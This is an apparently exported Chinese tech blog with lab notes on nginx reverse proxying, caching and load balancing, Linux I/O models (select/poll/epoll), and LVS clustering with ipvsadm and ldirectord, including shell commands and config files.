&#123;1..10&#125; ;do echo page$i on 8 &gt; test$i.html;done #在192.168.1.13运行]# service httpd restart 动态服务器配置ip为192.168.1.8 12345678910111213]# yum install -y httpd php php-mysql mysql-server]# service httpd restart]# service mysqld start]# mysql -e &quot;grant all on *.* to test@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;&quot;]# cat /var/www/html/index.php #测试php联通mysql页面&lt;?php$dsn=&apos;mysql:host=192.168.1.8;dbname=mysql&apos;;$username=&apos;test&apos;;$passwd=&apos;centos&apos;;$dbh=new PDO($dsn,$username,$passwd);var_dump($dbh);?&gt;]# for i in &#123;1..10&#125; ;do echo page$i on 13 &gt; test$i.html;done #生成调度文件 nginx代理服务器ip为192.168.1.18 反代功能： 123456789101112]# vim /etc/nginx/conf.d/a.com.conflocation ~ \.php$ &#123; proxy_pass http://192.168.1.8;&#125;location / &#123; proxy_set_header X-Real-IP $remote_addr; proxy_pass http://192.168.1.13;&#125;lcotion /bbs &#123; proxy_pass httpd://192.168.1.8/; #有url，将会把/bbs置换成/。 proxy_pass httpd://192.168.1.8； #无url，将会把/bbs补加在其后。&#125; 缓存功能： proxy_cache_path 必须放在http{}语句块中，而后续的server语句块也要加入相应的代码 1234567891011121314151617181920212223242526272829]# mkdir -pv /var/cache/nginx/mkdir: created directory ‘/var/cache/nginx’]# vim /etc/nginx/nginx.conf···http &#123;··· #开启缓存功能，与下面的缓存功能一起启用方可生效 proxy_cache_path /var/cache/nginx/nginx_cache levels=1:1:1 keys_zone=proxycache:20m inactive=120s max_size=1g;···]# vim /etc/nginx/conf.d/a.com.conf··· location / &#123; ##代理功能 proxy_pass http://192.168.1.13/; proxy_set_header X-Real-IP $remote_addr; ##缓存功能 proxy_cache proxycache; proxy_cache_key $request_uri; proxy_cache_valid 200 302 301 1h; proxy_cache_valid any 1m; #响应头部自定义添加，来自ngx_http_headers_module提供 add_header X-Via $server_addr; add_header X-Cache $upstream_cache_status; add_header X-Accel $server_name; &#125;···]# nginx -s reload 调度功能 123456789101112131415161718]# vim /etc/nginx/nginx.conf···http &#123;··· upstream www &#123; least_conn; #最少连接算法，类似lvs中的wlc算法。 #ip_hash; #源地址hash算法。 #hash $request_uri [consistent]; #对请求的uri进行hash后，对server的权重和取余 #hash $remote_addr; server 192.168.1.8:80; server 192.168.1.9:80 weight=3; server 192.168.1.13:80 backup|down; #down的适合灰度发布中使用 &#125;···]# vim /etc/nginx/conf.d/a.com.conf location / &#123; proxy_pass http://www; &#125; client端访问测试123456789101112131415161718192021222324252627282930313233343536373839404142]# curl 172.20.5.24 #出现下面页面说明反代成功static html]# curl 172.20.5.24/index.php #出现下面页面说明反代成功object(PDO)#1 (0) &#123;&#125;]# curl 172.20.5.24/bbswebbs]# ab -c 100 -n 1000 http://172.20.5.24/m.txt···Requests per second: 40.07 [#/sec] (mean) #缓存前···Requests per second: 68.24 [#/sec] (mean) #缓存后···]# curl -I 172.20.5.24/m.txt #后端的服务器相关内容都被隐藏了HTTP/1.1 200 OKServer: honginx/6.6.6Date: Sat, 07 Jul 2018 12:43:20 GMTContent-Type: text/plain; charset=UTF-8Content-Length: 1288618Connection: keep-aliveLast-Modified: Sat, 07 Jul 2018 00:14:11 GMTETag: &quot;28063c-13a9aa-5705da8e165e8&quot;X-Via: 172.20.5.24X-Cache: MISSX-Accel: www.a.comAccept-Ranges: bytesAccept-Ranges: bytes##测试调度功能]# for i in &#123;1..10&#125;;do curl 172.20.5.24/test$i.html;donepage1 on 13page2 on 13page3 on 13page4 on 8page5 on 8page6 on 8page7 on 8page8 on 8page9 on 8page10 on 13 在客户端测试时不会看到调度的效果，想要看到调度的效果需要把缓存关闭 感谢阅读！]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[I/O]]></title>
    <url>%2Fio.html</url>
    <content type="text"><![CDATA[摘要： I/O模型; 同步，异步； 阻塞，非阻塞； select/poll/epoll模型 Httpd MPM prefork：进程模型，两级结构，主进程master负责生成子进程，每个子进程负责响应一个请求worker：线程模型，三级结构，主进程master负责生成子进程，每个子进程负责生成多个线程，每个线程响应一个请求event：线程模型，三级结构,主进程master负责生成子进程，每个子进程响应多个请求 性能影响 有很多研究都表明，性能对用户的行为有很大的影响： 79%的用户表示不太可能再次打开一个缓慢的网站 47%的用户期望网页能在2秒钟以内加载 40%的用户表示如果加载时间超过三秒钟，就会放弃这个网站 页面加载时间延迟一秒可能导致转换损失7%，页面浏览量减少11% 8秒定律：用户访问一个网站时，如果等待网页打开的时间超过8秒，会有超过30%的用户放弃等待 I/O介绍 I/O: 网络IO：本质是socket读取磁盘IO： 每次IO，都要经由两个阶段： 第一步：将数据从磁盘文件先加载至内核内存空间（缓冲区），等待数据准备完成，时间较长第二步：将数据从内核缓冲区复制到用户空间的进程的内存中，时间较短 I/O模型 阻塞型、非阻塞型、复用型、信号驱动型、异步同步/异步：关注的是消息通信机制同步：synchronous，调用者等待被调用者返回消息，才能继续执行异步：asynchronous，被调用者通过状态、通知或回调机制主动通知调用者被调用者的运行状态阻塞/非阻塞：关注调用者在等待结果返回之前所处的状态阻塞：blocking，指IO操作需要彻底完成后才返回到用户空间，调用结果返回之前，调用者被挂起非阻塞：nonblocking，指IO操作被调用后立即返回给用户一个状态值，无需等到IO操作彻底完成，最终的调用结果返回之前，调用者不会被挂起 同步阻塞IO模型 同步阻塞IO模型是最简单的IO模型，用户线程在内核进行IO操作时被阻塞用户线程通过系统调用read发起IO读操作，由用户空间转到内核空间。内核等到数据包到达后，然后将接收的数据拷贝到用户空间，完成read操作用户需要等待read将数据读取到buffer后，才继续处理接收的数据。整个IO请求的过程中，用户线程是被阻塞的，这导致用户在发起IO请求时，不能做任何事情，对CPU的资源利用率不够 同步非阻塞IO模型 用户线程发起IO请求时立即返回。但并未读取到任何数据，用户线程需要不断地发起IO请求，直到数据到达后，才真正读取到数据，继续执行。即 “轮询”机制整个IO请求的过程中，虽然用户线程每次发起IO请求后可以立即返回，但是为了等到数据，仍需要不断地轮询、重复请求，消耗了大量的CPU的资源是比较浪费CPU的方式，一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性 I/O多路复用模型 多个连接共用一个等待机制，本模型会阻塞进程，但是进程是阻塞在select或者poll这两个系统调用上，而不是阻塞在真正的IO操作上用户首先将需要进行IO操作添加到select中，继续执行做其他的工作（异步），同时等待select系统调用返回。当数据到达时，IO被激活，select函数返回。用户线程正式发起read请求，读取数据并继续执行。从流程上来看，使用select函数进行IO请求和同步阻塞模型没有太大的区别，甚至还多了添加监视IO，以及调用select函数的额外操作，效率更差。并且阻塞了两次，但是第一次阻塞在select上时，select可以监控多个IO上是否已有IO操作准备就绪，即可达到在同一个线程内同时处理多个IO请求的目的。而不像阻塞IO那种，一次只能监控一个IO虽然上述方式允许单线程内处理多个IO请求，但是每个IO请求的过程还是阻塞的（在select函数上阻塞），平均时间甚至比同步阻塞IO模型还要长。如果用户线程只是注册自己需要的IO请求，然后去做自己的事情，等到数据到来时再进行处理，则可以提高CPU的利用率IO多路复用是最常使用的IO模型，但是其异步程度还不够“彻底”，因它使用了会阻塞线程的select系统调用。因此IO多路复用只能称为异步阻塞IO模型，而非真正的异步IO 多路I/O复用 IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备读取，就通知该进程IO多路复用适用如下场合：当客户端处理多个描述符时（一般是交互式输入和网络套接口），必须使用I/O复用当一个客户端同时处理多个套接字时，此情况可能的但很少出现当一个TCP服务器既要处理监听套接字，又要处理已连接套接字，一般也要用到I/O复用当一个服务器即要处理TCP，又要处理UDP，一般要使用I/O复用当一个服务器要处理多个服务或多个协议，一般要使用I/O复用 信号驱动IO模型 信号驱动IO：signal-driven I/O用户进程可以通过sigaction系统调用注册一个信号处理程序，然后主程序可以继续向下执行，当有IO操作准备就绪时，由内核通知触发一个SIGIO信号处理程序执行，然后将用户进程所需要的数据从内核空间拷贝到用户空间此模型的优势在于等待数据报到达期间进程不被阻塞。用户主程序可以继续执行，只要等待来自信号处理函数的通知该模型并不常用 异步IO模型 异步IO与信号驱动IO最主要的区别是信号驱动IO是由内核通知何时可以进行IO操作，而异步IO则是由内核告诉用户线程IO操作何时完成。信号驱动IO当内核通知触发信号处理程序时，信号处理程序还需要阻塞在从内核空间缓冲区拷贝数据到用户空间缓冲区这个阶段，而异步IO直接是在第二个阶段完成后，内核直接通知用户线程可以进行后续操作了相比于IO多路复用模型，异步IO并不十分常用，不少高性能并发服务程序使用IO多路复用模型+多线程任务处理的架构基本可以满足需求。目前操作系统对异步IO的支持并非特别完善，更多的是采用IO多路复用模型模拟异步IO的方式（IO事件触发时不直接通知用户线程，而是将数据读写完毕后放到用户指定的缓冲区中） 五种I/O模型 I/O模型的具体实现 主要实现方式有以下几种： 123456Select：Linux实现对应，I/O复用模型，BSD4.2最早实现Poll：Linux实现，对应I/O复用模型，System V unix最早实现Epoll：Linux实现，对应I/O复用模型，具有信号驱动I/O模型的某些特性Kqueue：FreeBSD实现，对应I/O复用模型，具有信号驱动I/O模型某些特性/dev/poll：SUN的Solaris实现，对应I/O复用模型，具有信号驱动I/O模型的某些特性Iocp Windows实现，对应第5种（异步I/O）模型 select/poll/epoll三种方式的对比： select Select:POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理 缺点 1234单个进程可监视的fd数量被限制，即能监听端口的数量有限 cat /proc/sys/fs/file-max对socket是线性扫描，即采用轮询的方法，效率较低select 采取了内存拷贝方法来实现内核将 FD 消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大 poll12345本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态其没有最大连接数的限制，原因是它是基于链表来存储的大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd边缘触发：只通知一次 epoll1234567epoll：在Linux 2.6内核中提出的select和poll的增强版本支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就需态，并且只会通知一次使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知优点:没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口)效率提升：非轮询的方式，不会随着FD数目的增加而效率下降；只有活跃可用的FD才会调用callback函数，即epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关内存拷贝，利用mmap(Memory Mapping)加速与内核空间的消息传递；即epoll使用mmap减少复制开销]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LvsTest]]></title>
    <url>%2Flvstest.html</url>
    <content type="text"><![CDATA[摘要： ipvsadm的用法 lvs-nat拓扑结构实验 lvs-dr拓扑结构实验 FWM ldirector的用法简介 ipvsadm 程序包：ipvsadm，用于管理集群 12345Unit File: ipvsadm.service主程序：/usr/sbin/ipvsadm规则保存工具：/usr/sbin/ipvsadm-save规则重载工具：/usr/sbin/ipvsadm-restore配置文件：/etc/sysconfig/ipvsadm-config ipvsadm 的基本用法 12345678910ipvsadm -A|E -t|u|f service-address [-s scheduler] [-p [timeout]] [-M netmask] [--pepersistence_engine] [-b sched-flags]ipvsadm -D -t|u|f service-address 删除ipvsadm –C 清空ipvsadm –R 重载ipvsadm -S [-n] 保存ipvsadm -a|e -t|u|f service-address -r server-address [options]ipvsadm -d -t|u|f service-address -r server-addressipvsadm -L|l [options]ipvsadm -Z [-t|u|f service-address] 管理集群服务：增、改、删 12ipvsadm -A|E -t|u|f service-address [-s scheduler][-p [timeout]]ipvsadm -D -t|u|f service-address service-address： 1234-t|u|f：-t: TCP协议的端口，VIP:TCP_PORT-u: UDP协议的端口，VIP:UDP_PORT-f：firewall MARK，标记，一个数字 [-s scheduler]：指定集群的调度算法，默认为wlc 管理集群上的RS：增、改、删1234增、改：ipvsadm -a|e -t|u|f service-address -r server-address [-g|i|m] [-w weight] 删：ipvsadm -d -t|u|f service-address -r server-addressserver-address：rip[:port] 如省略port，不作端口映射 选项： 1234-g: gateway, dr类型，默认-i: ipip, tun类型-m: masquerade, nat类型-w weight：权重 集群内容的查看12345678ipvsadm –C 清空定义的所有内容ipvsadm -Z [-t|u|f service-address] 清空计数器ipvsadm -L|l [options]--numeric, -n：以数字形式输出地址和端口号--exact：扩展信息，精确值 --connection，-c：当前IPVS连接输出--stats：统计信息--rate ：输出速率信息 ipvs规则：/proc/net/ip_vsipvs连接：/proc/net/ip_vs_conn 保存：建议保存至/etc/sysconfig/ipvsadm 123ipvsadm-save &gt; /PATH/TO/IPVSADM_FILEipvsadm -S &gt; /PATH/TO/IPVSADM_FILEsystemctl stop ipvsadm.service 重载： 123ipvsadm-restore &lt; /PATH/FROM/IPVSADM_FILEipvsadm -R &lt; /PATH/FROM/IPVSADM_FILEsystemctl restart ipvsadm.service 集群NAT服务试验LVS-nat director的设置 前提网关已经全部搭载好 vip:172.20.0.24 dip:192.168.1.1/24 rip1:192.168.1.16 ;rip2:192.168.1.8 123456789101112131415161718192021222324252627]# ifconfig eth0 172.20.0.16/16 up]# ifconfig eth0:0 172.20.0.24/16 up]# ifconfig eth1 192.168.1.1/24 up]# ipvsadm -A -t 172.20.0.24:80 -s rr]# ipvsadm -L -n]# ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.16 -m]# ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.8 -m]# ipvsadm -L -n --statsIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Conns InPkts OutPkts InBytes OutBytes -&gt; RemoteAddress:PortTCP 172.20.0.24:80 15 47 0 2540 0 -&gt; 192.168.1.8:80 8 24 0 1304 0 -&gt; 192.168.1.16:80 7 23 0 1236 0##查看状态]# ipvsadm -Z ]# ipvsadm -L -n --stats]# ipvsadm -L -n --rate##切换wrr模式]# ipvsadm -E -t 172.20.0.24:80 -s wrr]# ipvsadm -e -t 172.20.0.24:80 -r 192.168.1.16 -m -w 3]# ipvsadm -e -t 172.20.0.24:80 -r 192.168.1.8 -m ]# ipvsadm -L -n --stats]# ipvsadm -L -c]# ipvsadm -L --timeout ps: keepalive下载： wget http://www.keepalived.org/software/keepalived-1.2.5.tar.gz lvs-dr实现如下拓扑结构的实验 router的相关设置 12345]# vim /etc/sysctl.conf ]# net.ipv4.ip_forward = 1]# ifconfig eth2 192.168.1.254/24 up]# ifconfig eth1 172.20.0.1/16 up]# ifconfig eth0 192.168.0.254/24 up director的相关设置 dip:192.168.1.7/24 vip:172.20.0.24/16 1234567]# iptables -t filter -F]# ifconfig eth0 192.168.1.7/24 up]# ifconfig eth0:0 172.20.0.24/16 up]# route add -host 172.20.0.24 dev eth0:0 #目标是172.20.0.24的，必须经过eth0:0]# ipvsadm -A -t 172.20.0.24:80 -s rr]# ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.8 -g]# ipvsadm -a -t 172.20.0.24:80 -r 192.168.1.16 -g RS1的相关设置 rip:192.168.1.16/24 vip:172.20.0.24 1234567891011]# ifconfig eth0 192.168.1.16/24 up]# route add default gw 192.168.1.254]# echo 1 &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore]# echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore]# echo 2 &gt; /proc/sys/net/ipv4/conf/lo/arp_announce]# echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce]# ifconfig lo0:0 172.20.0.24 netmask 255.255.255.255 broadcast 172.20.0.24 up]# route add -host 172.20.0.24 dev lo:0]# yum install -y httpd]# echo RS1 &gt; /var/www/html/index.html]# systemctl start httpd RS2的相关设置 rip:192.168.1.8/24 vip:172.20.0.24 1234567891011]# ifconfig eth0 192.168.1.8/24 up]# route add default gw 192.168.1.254]# echo 1 &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore]# echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore]# echo 2 &gt; /proc/sys/net/ipv4/conf/lo/arp_announce]# echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce]# ifconfig lo0:0 172.20.0.24 netmask 255.255.255.255 broadcast 172.20.0.24 up]# route add -host 172.20.0.24 dev lo:0]# yum install -y httpd]# echo RS2 &gt; /var/www/html/index.html]# systemctl start httpd client的设置及效果检验 12345678910111213]# ifconfig eth0 192.168.0.10.24 up]# route add default 192.168.0.254 dev eth0]# for i in &#123;1..10&#125;;do curl 172.20.0.24 ;doneRS1RS2RS1RS2RS1RS2RS1RS2RS1RS2 FireWall MarkFWM：FireWall Mark MARK target 可用于给特定的报文打标记–set-mark value 其中：value 可为0xffff格式，表示十六进制数字 借助于防火墙标记来分类报文，而后基于标记定义集群服务；可将多个不同的应用使用同一个集群服务进行调度 实现方法： 在Director主机打标记： 12]# iptables -t mangle -A PREROUTING -d $vip -p $proto –m multiport \--dports $port1,$port2,… -j MARK --set-mark NUMBER 在Director主机基于标记定义集群服务： 123ipvsadm -A -f NUMBER [options]ipvsadm -a -f NUMBER -r 192.168.1.8 -gipvsadm -a -f NUMBER -r 192.168.1.16 -g LVS Persistence 持久连接（ lvs persistence ）模板：实现无论使用任何调度算法，在一段时间内（默认300s ），能够实现将来自同一个地址的请求始终发往同一个RS PCC：将来自于同一个客户端发往VIP的所有请求统统定向至一个RS； PPC：将来与一个客户端发往某VIP的某端口的所有请求统统定向至统一个RS； PFWMC: 端口绑定，基于防火墙标记，将两个或两个以上的端口绑定为同一个服务，即port affinity. 1ipvsadm -A|E -t|u|f service-address -s scheduler] ldirctord监控和控制LVS守护进程，可管理LVS规则； 监控和管理实际服务器守护进程在LVS集群负载均衡的虚拟服务器 。 包名：ldirectord-3.9.6-0rc1.1.1.x86_64.rpm 下载：官网 1234567891011121314]# wget http://opensuse.ucom.am/repositories/network:/ha-clustering:/Stable/RedHat_RHEL-6/x86_64/ldirectord-3.9.6-0rc1.1.1.x86_64.rpm]# yum install -y ldirectord-3.9.6-0rc1.1.1.x86_64.rpm]# rpm -ql ldirectord/etc/ha.d/etc/ha.d/resource.d/etc/ha.d/resource.d/ldirectord/etc/init.d/ldirectord/etc/logrotate.d/ldirectord/usr/lib/ocf/resource.d/heartbeat/ldirectord/usr/sbin/ldirectord/usr/share/doc/ldirectord-3.9.6/usr/share/doc/ldirectord-3.9.6/COPYING/usr/share/doc/ldirectord-3.9.6/ldirectord.cf/usr/share/man/man8/ldirectord.8.gz 相关文件的介绍： 123456/etc/ha.d/ldirectord.cf 主配置文件,按需修改，可以通过模板复制过来。/usr/share/doc/ldirectord-3.9.6/ldirectord.cf 配置模版文件/usr/lib/systemd/system/ldirectord.service 服务/usr/sbin/ldirectord 主程序/var/log/ldirectord.log 日志/var/run/ldirectord.ldirectord.pid pid文件 配置文件说明 1234567891011121314151617181920]# iptables -t mangle -A PREROUTING -d $vip -p $proto –m multiport \--dports $port1,$port2,… -j MARK --set-mark 5]# vim /etc/ha.d/ldirectord.cfchecktimeout=3checkinterval=1autoreload=yes #自动加载已经更改的配置logfile=&quot;/var/log/ldirectord.log&quot; #日志文件quiescent=no #down时yes权重为0，no为删除virtual=172.20.0.24:80 #指定VS的FWM或IP：port real=172.16.0.7 gate 2 #gate（DR模型） 1(权重) real=172.16.0.8 gate 1 fallback=127.0.0.1 gate #sorry server service=http scheduler=wrr protocol=fwm checktype=negotiate #测试的类型（健康性检查的方式） checkport=80 request=&quot;index.html&quot; #要探测的页面（准备一个测试页比较好） receive=&quot;Test Ldirectord&quot; 实现ldirecrtor搭建DR模型在rs服务器运行脚本 1234567891011121314151617181920212223242526272829303132333435]# cat lvs_dr_rs.sh #!/bin/bashvip=172.20.0.24mask=&apos;255.255.255.255&apos;dev=lo:1rpm -q httpd &amp;&gt; /dev/null || yum -y install httpd &amp;&gt;/dev/nullservice httpd start &amp;&gt; /dev/null &amp;&amp; echo &quot;The httpd Server is Ready!&quot;echo &quot;`hostname`&quot; &gt; /var/www/html/index.htmlcase $1 instart) echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore echo 1 &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce echo 2 &gt; /proc/sys/net/ipv4/conf/lo/arp_announce ifconfig $dev $vip netmask $mask echo &quot;The RS Server is Ready!&quot; ;;stop) ifconfig $dev down echo 0 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore echo 0 &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore echo 0 &gt; /proc/sys/net/ipv4/conf/all/arp_announce echo 0 &gt; /proc/sys/net/ipv4/conf/lo/arp_announce echo &quot;The RS Server is Canceled!&quot; ;;*) echo &quot;Usage: $(basename $0) start|stop&quot; exit 1 ;;esac]# bash lvs_dr_rs.sh ]# yum install -y httpd]# echo `hostname` &gt; /var/www/html/index.html]# systemctl start httpd 在lvs服务器上运行 1234567891011121314151617181920212223242526272829303132]# cat lvs_dr_vs.sh #!/bin/bashvip=&apos;172.20.0.24&apos;iface=&apos;ens33:1&apos;mask=&apos;255.255.255.255&apos;port=&apos;80&apos;rs1=&apos;192.168.1.16&apos;rs2=&apos;192.168.1.8&apos;scheduler=&apos;wrr&apos;type=&apos;-g&apos;rpm -q ipvsadm &amp;&gt; /dev/null || yum -y install ipvsadm &amp;&gt; /dev/nullcase $1 instart) ifconfig $iface $vip netmask $mask #broadcast $vip up iptables -F ipvsadm -A -t $&#123;vip&#125;:$&#123;port&#125; -s $scheduler ipvsadm -a -t $&#123;vip&#125;:$&#123;port&#125; -r $&#123;rs1&#125; $type -w 1 ipvsadm -a -t $&#123;vip&#125;:$&#123;port&#125; -r $&#123;rs2&#125; $type -w 1 echo &quot;The VS Server is Ready!&quot; ;;stop) ipvsadm -C ifconfig $iface down echo &quot;The VS Server is Canceled!&quot; ;;*) echo &quot;Usage: $(basename $0) start|stop&quot; exit 1 ;;esac 在lvs上配置ldiretord12345678910111213141516]# vim /etc/ha.d/ldirectord.cf# Sample for an http virtual servicevirtual=172.20.0.24:80 real=192.168.1.16 gate 1 不用写端口号 real=192.168.1.8 gate 3 不用写端口号# fallback=127.0.0.1:80 gate service=http scheduler=wrr #persistent=600 持久连接，启用后就会一直往一个服务器上调度了 #netmask=255.255.255.255 protocol=fwm #这个加不加都可以 checktype=negotiate checkport=80 request=&quot;index.html&quot; receive=&quot;test&quot;# virtualhost=www.x.y.z 启动ldirecrord没有手工加ipvsadm策略，启动服务的时候会自动根据配置文件，生成的ipvsadm策略 12345678]# systemctl start ldirectord]# ipvsadm -L -n --statsIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Conns InPkts OutPkts InBytes OutBytes -&gt; RemoteAddress:PortTCP 172.20.0.24:80 15 47 0 2540 0 -&gt; 192.168.1.8:80 8 24 0 1304 0 -&gt; 192.168.1.16:80 7 23 0 1236 0 ldirectord实现的检测功能，一旦RS宕机，会立即从ipvsadm删除宕机的服务器; 模拟宕机停止rs上的httpd服务即可实验。 观察ldirectord日志 1]# tail -f /var/log/ldirectord.log 结语ldirectord实现的是RS的服务器高可用，一旦ldirectord所在服务器宕机,存在单点失败的问题; keepalived负责负载均衡器之间的failover，haproxy或者lvs（ipvsadm）负责健康检查和失败切换； 可以使用三者结合的方法，实现架构的可用性。这个后续有待验证。]]></content>
      <categories>
        <category>LVS</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Vitual Server]]></title>
    <url>%2Flvs.html</url>
    <content type="text"><![CDATA[摘要： 集群概念 LVS介绍 LVS实现 ldirectord Cluster概念 系统扩展方式：Scale UP：向上扩展,增强Scale Out：向外扩展,增加设备，调度分配问题，Cluster Cluster：集群,为解决某个特定问题将多台计算机组合起来形成的单个系统 Linux Cluster类型： LB：Load Balancing，负载均衡 HA：High Availiablity，高可用，SPOF（single Point Of failure） MTBF:Mean Time Between Failure 平均无故障时间MTTR:Mean Time To Restoration（ repair）平均恢复前时间A=MTBF/（MTBF+MTTR） (0,1)：99%, 99.5%, 99.9%, 99.99%, 99.999% HPC：High-performance computing，高性能 www.top500.org 分布式系统：分布式存储：云盘,fastdfs分布式计算：hadoop，Spark cluster 分类 基于工作的协议层次划分： 传输层（通用）：DPORTLVS：nginx：streamhaproxy：mode tcp 应用层（专用）：针对特定协议，自定义的请求模型分类 proxy server：http：nginx, httpd, haproxy(mode http), …fastcgi：nginx, httpd, …mysql：mysql-proxy, … cluster 相关 会话保持：负载均衡 1234567(1) session sticky：始终将同一个请求连接定向至同一个RS，同一用户调度固定服务器Source IP：LVS sh算法（对某一特定服务而言）Cookie(2) session replication：每台服务器拥有全部session,因此对于大规模集群环境不适用session multicast cluster(3) session server：专门的session服务器,利用单独部署的服务器来统一管理session。Memcached，Redis HA集群实现方案 12345keepalived:vrrp协议ais:应用接口规范heartbeatcman+rgmanager(RHCS)coresync_pacemaker LVS LVS：Linux Virtual Server，负载调度器，集成于内核，章文嵩博士开发 官网：http://www.linuxvirtualserver.org/123VS: Virtual Server，负责调度RS: Real Server，负责真正提供服务L4：四层路由器或交换机 工作原理：VS根据请求报文的目标IP和目标协议及端口将其调度转发至某RS，根据调度算法来挑选RS iptables/netfilter： 123456iptables：用户空间的管理工具netfilter：内核空间上的框架流入：PREROUTING --&gt; INPUT流出：OUTPUT --&gt; POSTROUTING转发： PREROUTING --&gt; FORWARD --&gt; POSTROUTINGDNAT：目标地址转换； PREROUTING lvs集群类型中的术语： 123456789VS：Virtual Server，Director Server(DS)Dispatcher(调度器)，Load BalancerRS：Real Server(lvs), upstream server(nginx)backend server(haproxy)CIP：Client IPVIP: Virtual serve IP VS外网的IPDIP: Director IP VS内网的IPRIP: Real server IP访问流程：CIP &lt;--&gt; VIP == DIP &lt;--&gt; RIP lvs: ipvsadm/ipvs ipvsadm：用户空间的命令行工具，规则管理器，用于管理集群服务及RealServer ipvs：工作于内核空间netfilter的INPUT钩子上的框架 lvs集群的类型： lvs-nat：修改请求报文的目标IP,多目标IP的DNAT lvs-dr：操纵封装新的MAC地址 lvs-tun：在原请求IP报文之外新加一个IP首部 lvs-fullnat：修改请求报文的源和目标IP lvs-nat：本质是多目标IP的DNAT，通过将请求报文中的目标地址和目标端口修改为某挑出的RS的RIP和PORT实现转发 RIP和DIP应在同一个IP网络，最好使用私网地址；RS的网关要指向DIP 请求报文和响应报文都必须经由Director转发，Director易于成为系统瓶颈 支持端口映射，可修改请求报文的目标PORT VS必须是Linux系统，RS可以是任意OS系统 LVS-DR LVS-DR：Direct Routing，直接路由，LVS默认模式,应用最广泛,通过为请求报文重新封装一个MAC首部进行转发，源MAC是DIP所在的接口的MAC，目标MAC是某挑选出的RS的RIP所在接口的MAC地址；源IP/PORT，以及目标IP/PORT均保持不变 Director和各RS都配置有VIP 确保前端路由器将目标IP为VIP的请求报文发往Director 1234567891011121314151617181.在前端网关做静态绑定VIP和Director的MAC地址2.在RS上使用arptables工具arptables -A IN -d $VIP -j DROParptables -A OUT -s $VIP -j mangle --mangle-ip-s $RIP3.在RS上修改内核参数以限制arp通告及应答级别 /proc/sys/net/ipv4/conf/all/arp_ignore/proc/sys/net/ipv4/conf/all/arp_announce]# echo net.ipv4.conf.all.arp_ignore = 1 &gt;&gt; /etc/sysctl.conf]# echo net.ipv4.conf.all.arp_announce = 2 &gt;&gt; /etc/sysctl.conf]# sysctl -p推荐修改内核配置，数字说明。 arp_announce : 0：默认值，把本机所有接口的所有信息向每个接口的网络进行通告 1：尽量避免将接口信息向非直接连接网络进行通告 2：必须避免将接口信息向非本网络进行通告 arp_ignore: 0：默认值，表示可使用本地任意接口上配置的任意地址进行响应 1: 仅在请求的目标IP配置在本地主机的接收到请求报文的接口上时，才给予响应 RS的RIP可以使用私网地址，也可以是公网地址；RIP与DIP在同一IP网络；RIP的网关不能指向DIP，以确保响应报文不会经由Director RS和Director要在同一个物理网络 请求报文要经由Director，但响应报文不经由Director，而由RS直接发往Client 不支持端口映射（端口不能修败） RS可使用大多数OS系统 lvs-tun转发方式：不修改请求报文的IP首部（源IP为CIP，目标IP为VIP），而在原IP报文之外再封装一个IP首部（源IP是DIP，目标IP是RIP），将报文发往挑选出的目标RS；RS直接响应给客户端（源IP是VIP，目标IP是CIP） DIP, VIP, RIP都应该是公网地址 RS的网关一般不能指向DIP 请求报文要经由Director，但响应不能经由Director 不支持端口映射 RS的OS须支持隧道功能 lvs调度算法lvs的调度方法：10种 静态方法：仅根据算法本身进行调度 RR：Round Robin WRR: Weigted RR SH: Source Hashing，实现session sticky，源IP地址hash DH:Destination Hashing， 动态方法:主要根据每RS当前的负载状态及调度算法进行调度Overhead=value，较小的RS将被调度 LC： Least Connection ​ Overhead= Active*256+Inactive WLC: Weigted LC，默认调度方法 ​ Overhead=(Active*256+Inactive)/Weight SED: Shortest Expect Delay ​ Overhead=(Active+1)*256/weight NQ：Never Queue，第一轮均匀分配，后续SED LBLC：Locality-Based LC，动态的DH算法，使用场景：根据负载状态实现正向代理 LBLCR：LBLC with Replication，带复制功能的LBLC解决LBLC负载不均衡问题，从负载重的复制到负载轻的RS 总结 lvs-nat与lvs-fullnat：请求和响应报文都经由Director lvs-nat：RIP的网关要指向DIPlvs-fullnat：RIP和DIP未必在同一IP网络，但要能通信 lvs-dr与lvs-tun：请求报文要经由Director，但响应报文由RS直接发往Client 